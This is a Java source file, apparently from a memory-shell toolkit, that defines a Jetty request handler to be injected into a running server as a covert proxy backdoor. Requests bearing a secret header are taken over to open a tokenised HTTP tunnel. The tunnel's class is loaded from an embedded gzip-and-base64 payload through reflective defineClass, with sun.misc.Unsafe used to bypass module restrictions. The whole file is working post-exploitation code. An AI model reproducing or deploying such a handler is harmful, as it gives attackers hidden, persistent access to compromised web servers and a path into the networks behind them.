package com.reajason.javaweb.memshell.shelltool.proxy;

import org.eclipse.jetty.server.Handler;
import org.eclipse.jetty.server.Request;
import org.eclipse.jetty.server.Response;
import org.eclipse.jetty.util.Callback;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.ByteBuffer;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.RejectedExecutionException;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPInputStream;

public class ProxyJettyHandler implements Runnable, ThreadFactory {
    private static final int MAX_PUSH_SIZE = 4 * 1024 * 1024;
    // One pull and one push worker per ProxyHttp session; excess work is rejected.
    private static final int MAX_HTTP_THREADS = 256;
    private static final ExecutorService JETTY12_EXECUTOR = new ThreadPoolExecutor(
            0, MAX_HTTP_THREADS, 30L, TimeUnit.SECONDS,
            new SynchronousQueue<Runnable>(), new ProxyJettyHandler());
    private static volatile Class<?> proxyHttpClass;
    private static String proxyHttpGZipBase64;
    private static String headerName;
    private static String headerValue;
    private Object nextHandler;

    private Object jettyRequest;
    private Object jettyResponse;
    private Object jettyCallback;
    private String jettyMethod;
    private String jettyToken;
    private Object jettySession;
    private boolean jettyPullStarted;
    private boolean jettyStreaming;
    private boolean jettyCompleted;

    public ProxyJettyHandler() {
    }

    public boolean handle(Object request, Object response) {
        try {
            return getProxyHttpClass().newInstance().equals(new Object[]{request, response});
        } catch (Throwable ignored) {
        }
        return false;
    }

    // jetty12
    public boolean handle(Request request, Response response, Callback callback) throws Exception {
        String method = null;
        String token = null;
        String header = null;
        try {
            if (headerName != null) {
                Object headers = invokeMethod(request, "getHeaders");
                header = (String) invokeMethod(headers, "get", new Class[]{String.class}, new Object[]{headerName});
            }
            method = (String) invokeMethod(request, "getMethod");
            Object uri = invokeMethod(request, "getHttpURI");
            token = queryParameter((String) invokeMethod(uri, "getQuery"), "token");
        } catch (Throwable ignored) {
        }
        boolean get = "GET".equalsIgnoreCase(method);
        boolean post = "POST".equalsIgnoreCase(method);
        if (token == null || !get && (!post || token.length() == 0)
                || header == null || headerValue == null || headerValue.length() == 0
                || !header.contains(headerValue)) {
            return ((Handler) nextHandler).handle(request, response, callback);
        }

        ProxyJettyHandler task = new ProxyJettyHandler();
        task.jettyRequest = request;
        task.jettyResponse = response;
        task.jettyCallback = callback;
        task.jettyMethod = method;
        task.jettyToken = token;
        try {
            JETTY12_EXECUTOR.execute(task);
        } catch (RejectedExecutionException e) {
            task.sendJetty12Full(429, new byte[0]);
        } catch (Throwable e) {
            task.sendJetty12Full(500, new byte[0]);
        }
        return true;
    }

    // jetty6
    public void handle(String target, HttpServletRequest request, HttpServletResponse response, int dispatch) throws IOException, ServletException {
        if (handle(request, response)) {
            invokeMethod(request, "setHandled", new Class[]{boolean.class}, new Object[]{true});
            return;
        }
        if (nextHandler != null) {
            invokeMethod(nextHandler, "handle",
                    new Class[]{String.class, HttpServletRequest.class, HttpServletResponse.class, int.class},
                    new Object[]{target, request, response, dispatch});
        }
    }

    // jetty7+
    public void handle(String target, Request baseRequest, HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        if (handle(request, response)) {
            invokeMethod(baseRequest, "setHandled", new Class[]{boolean.class}, new Object[]{true});
            return;
        }
        if (nextHandler != null) {
            invokeMethod(nextHandler, "handle",
                    new Class[]{String.class, Request.class, HttpServletRequest.class, HttpServletResponse.class},
                    new Object[]{target, baseRequest, request, response});
        }
    }

    @Override
    public Thread newThread(Runnable runnable) {
        Thread thread = new Thread(runnable, "proxy-jetty12-http");
        thread.setDaemon(true);
        return thread;
    }

    @Override
    public void run() {
        try {
            if ("GET".equals(jettyMethod)) {
                if (jettyToken.length() == 0) {
                    processJetty12Authorize();
                } else {
                    processJetty12Pull();
                }
            } else {
                processJetty12Push();
            }
        } catch (Throwable e) {
            failJetty12(e);
        } finally {
            if (jettyPullStarted) {
                try {
                    jettySession.getClass().getMethod("endPull").invoke(jettySession);
                } catch (Throwable ignored) {
                }
            }
        }
    }

    private void processJetty12Authorize() throws Exception {
        String token = (String) getProxyHttpClass().getMethod("createSession").invoke(null);
        if (token == null) {
            sendJetty12Full(429, new byte[0]);
            return;
        }
        sendJetty12Full(200, ("token=" + token).getBytes("US-ASCII"));
    }

    private void processJetty12Pull() throws Exception {
        if (!isValidJetty12Token()) {
            sendJetty12Full(400, new byte[0]);
            return;
        }
        jettySession = getProxyHttpClass().getMethod("getOrCreateSession", String.class).invoke(null, jettyToken);
        if (jettySession == null) {
            sendJetty12Full(429, new byte[0]);
            return;
        }
        if (!Boolean.TRUE.equals(jettySession.getClass().getMethod("beginPull").invoke(jettySession))) {
            sendJetty12Full(409, new byte[0]);
            return;
        }
        jettyPullStarted = true;
        invokeMethod(jettyResponse, "setStatus", new Class[]{int.class}, new Object[]{200});
        putJetty12Header("Content-Type", "text/plain");
        putJetty12Header("X-Accel-Buffering", "no");
        writeJetty12Chunk("\n".getBytes("US-ASCII"), false);
        while (true) {
            byte[] data = (byte[]) jettySession.getClass().getMethod("poll").invoke(jettySession);
            if (data != null && data.length == 0) {
                writeJetty12Chunk(new byte[0], true);
                return;
            }
            String line = data == null ? "\n" : encodeBase64(data) + "\n";
            writeJetty12Chunk(line.getBytes("US-ASCII"), false);
        }
    }

    private void processJetty12Push() throws Exception {
        if (!isValidJetty12Token()) {
            sendJetty12Full(400, new byte[0]);
            return;
        }
        jettySession = getProxyHttpClass().getMethod("getOrCreateSession", String.class).invoke(null, jettyToken);
        if (jettySession == null) {
            sendJetty12Full(429, new byte[0]);
            return;
        }
        if (isJetty12SessionClosed()) {
            sendJetty12Full(410, new byte[0]);
            return;
        }

        byte[] body;
        InputStream input = (InputStream) Request.class.getMethod("asInputStream", Request.class)
                .invoke(null, jettyRequest);
        try {
            body = readAll(input);
        } finally {
            input.close();
        }
        if (body.length == 0) {
            closeJetty12Session();
            sendJetty12Full(200, new byte[0]);
            return;
        }

        byte[] data;
        try {
            data = decodeBase64(new String(body, "ISO-8859-1").trim());
        } catch (Throwable e) {
            closeJetty12Session();
            sendJetty12Full(400, new byte[0]);
            return;
        }
        try {
            jettySession.getClass().getMethod("write", byte[].class).invoke(jettySession, data);
        } catch (Throwable e) {
            if (isJetty12SessionClosed() || hasCause(e, IOException.class)) {
                closeJetty12Session();
                sendJetty12Full(410, new byte[0]);
                return;
            }
            throw e;
        }
        sendJetty12Full(200, new byte[0]);
    }

    private boolean isValidJetty12Token() throws Exception {
        return Boolean.TRUE.equals(getProxyHttpClass().getMethod("isValidToken", String.class)
                .invoke(null, jettyToken));
    }

    private boolean isJetty12SessionClosed() {
        try {
            return Boolean.TRUE.equals(jettySession.getClass().getMethod("isClosed").invoke(jettySession));
        } catch (Throwable ignored) {
            return false;
        }
    }

    private void closeJetty12Session() {
        if (jettySession != null) {
            try {
                jettySession.getClass().getMethod("close").invoke(jettySession);
            } catch (Throwable ignored) {
            }
        }
    }

    private void sendJetty12Full(int status, byte[] body) {
        if (jettyCompleted) {
            return;
        }
        invokeMethod(jettyResponse, "setStatus", new Class[]{int.class}, new Object[]{status});
        putJetty12Header("Content-Type", "text/plain");
        putJetty12Header("Content-Length", String.valueOf(body.length));
        writeJetty12Chunk(body, true);
    }

    private void putJetty12Header(String name, String value) {
        Object headers = invokeMethod(jettyResponse, "getHeaders");
        invokeMethod(headers, "put", new Class[]{String.class, String.class}, new Object[]{name, value});
    }

    private void writeJetty12Chunk(byte[] body, boolean last) {
        Object callback = jettyCallback;
        if (!last) {
            jettyStreaming = true;
            try {
                callback = Class.forName("org.eclipse.jetty.util.Callback$Completable", true,
                        Callback.class.getClassLoader()).newInstance();
            } catch (Throwable e) {
                throw new RuntimeException(e);
            }
        }
        invokeMethod(jettyResponse, "write",
                new Class[]{boolean.class, ByteBuffer.class, Callback.class},
                new Object[]{last, ByteBuffer.wrap(body), callback});
        if (last) {
            jettyCompleted = true;
        } else {
            invokeMethod(callback, "get");
        }
    }

    private void failJetty12(Throwable error) {
        closeJetty12Session();
        if (jettyCompleted) {
            return;
        }
        if (!jettyStreaming) {
            try {
                sendJetty12Full(500, new byte[0]);
                return;
            } catch (Throwable ignored) {
            }
        }
        jettyCompleted = true;
        try {
            Callback.class.getMethod("failed", Throwable.class).invoke(jettyCallback, error);
        } catch (Throwable ignored) {
        }
    }

    private static byte[] readAll(InputStream input) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int count;
        while ((count = input.read(buffer)) >= 0) {
            if (count > 0) {
                if (output.size() + count > MAX_PUSH_SIZE) {
                    throw new IOException("PHT push body is too large");
                }
                output.write(buffer, 0, count);
            }
        }
        return output.toByteArray();
    }

    private static String queryParameter(String query, String name) {
        if (query == null) {
            return null;
        }
        String[] parameters = query.split("&");
        for (String parameter : parameters) {
            int separator = parameter.indexOf('=');
            String key = separator < 0 ? parameter : parameter.substring(0, separator);
            if (name.equals(key)) {
                return separator < 0 ? "" : parameter.substring(separator + 1);
            }
        }
        return null;
    }

    private static boolean hasCause(Throwable error, Class<?> type) {
        Throwable current = error;
        while (current != null) {
            if (type.isInstance(current)) {
                return true;
            }
            if (current.getCause() == current) {
                break;
            }
            current = current.getCause();
        }
        return false;
    }

    private static String encodeBase64(byte[] value) throws Exception {
        try {
            Class<?> codecClass = Class.forName("java.util.Base64");
            Object encoder = codecClass.getMethod("getEncoder").invoke(null);
            return ((String) encoder.getClass().getMethod("encodeToString", byte[].class)
                    .invoke(encoder, value)).replaceAll("[\r\n]", "");
        } catch (Throwable e) {
            Class<?> codecClass = Class.forName("sun.misc.BASE64Encoder");
            return ((String) codecClass.getMethod("encode", byte[].class)
                    .invoke(codecClass.newInstance(), value)).replaceAll("[\r\n]", "");
        }
    }

    private Class<?> getProxyHttpClass() throws Exception {
        if (proxyHttpClass == null) {
            synchronized (ProxyJettyHandler.class) {
                if (proxyHttpClass == null) {
                    byte[] bytes = gzipDecompress(decodeBase64(proxyHttpGZipBase64));
                    proxyHttpClass = reflectionDefineClass(bytes);
                }
            }
        }
        return proxyHttpClass;
    }

    public Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
        Object unsafe = null;
        Object rawModule = null;
        long offset = 48;
        Method getAndSetObjectM = null;
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            unsafe = unsafeField.get(null);
            rawModule = Class.class.getMethod("getModule").invoke(this.getClass(), (Object[]) null);
            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
            Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
            getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
        } catch (Throwable ignored) {
        }
        try {
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
            Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defMethod.setAccessible(true);
            Class<?> clazz = (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
            return clazz;
        } finally {
            if (getAndSetObjectM != null && rawModule != null) {
                try {
                    getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
                } catch (Throwable ignored) {
                }
            }
        }
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName) {
        return invokeMethod(obj, methodName, null, null);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Class<?> originalClass = clazz;
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                if (paramClazz == null) {
                    method = originalClass.getMethod(methodName);
                } else {
                    method = originalClass.getMethod(methodName, paramClazz);
                }
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + (obj instanceof Class ? ((Class<?>) obj).getName() : obj.getClass().getName()) + "." + methodName, e);
        }
    }

    @SuppressWarnings("all")
    private static byte[] decodeBase64(String value) throws Exception {
        try {
            Class<?> decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (Throwable e) {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class)
                    .invoke(decoderClass.newInstance(), value);
        }
    }

    private static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream input = new GZIPInputStream(new ByteArrayInputStream(compressedData));
        try {
            byte[] buffer = new byte[4096];
            int count;
            while ((count = input.read(buffer)) > 0) {
                out.write(buffer, 0, count);
            }
            return out.toByteArray();
        } finally {
            input.close();
            out.close();
        }
    }
}
